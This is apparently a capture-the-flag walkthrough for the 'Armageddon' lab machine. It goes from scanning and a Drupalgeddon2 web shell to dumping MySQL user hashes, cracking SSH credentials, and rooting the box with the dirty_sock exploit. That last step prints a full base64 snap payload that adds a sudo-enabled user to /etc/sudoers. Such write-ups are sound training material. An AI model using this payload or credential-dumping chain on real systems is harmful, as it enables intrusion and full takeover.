1. Connect the box, get IP.
2. Do a nmap scan:
    ```bash
    nmap -A -Pn 10.10.10.233
    ```

    ![](./images/armageddon1.png)

3. Run gobuster for directory bruteforcing:
    ```bash
    gobuster dir -u 10.10.10.233 -w /usr/share/wordlists/dirb/common.txt -z -t 100
    ```

    ![](./images/armageddon2.png)

4. Visit the website 'http://10.10.10.233:80/'. It looks like this:  

    ![](./images/armageddon3.png)  

5. Use [this RCE](https://github.com/dreadlocked/Drupalgeddon2) to get a web-shell.
6. In the './sites/default/settings.php' file, there is the username and password for MySQL:
    ```
    username: drupaluser
    password: CQHEy@9M*m23gBVj
    ```
7. Run the following command to show databases:
    ```bash
    mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'show databases;'
    ```
8. There's a database named drupal, further looking we find a table named 'users' in it, and columns name, mail and pass in it. Get those:
    ```bash
    mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'select name,pass,mail from drupal.users;'
    ```
    We get this:
    ```
    brucetherealadmin	$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt	admin@armageddon.eu
    ```
    Crack it using John to get ssh creds:
    ```
    brucetherealadmin:booboo
    ```
    Login to SSH and get 'user.txt'.
9. Run:  
    ```bash
    sudo -l
    ```  
    and get this:  

    ![](./images/armageddon4.png)

10. Refer to [this link](https://0xdf.gitlab.io/2019/02/13/playing-with-dirty-sock.html#local-vm).
11. Run this:
    ```bash
    python -c 'print "aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" + "A"*4256 + "=="' | base64 -d > try.snap
    ```
    and then install it using:
    ```bash
    sudo /usr/bin/snap install --dangerous --devmode *.snap
    ```
12. su into:
    ```
    dirty_sock:dirty_sock
    ```
    and get 'root.txt'
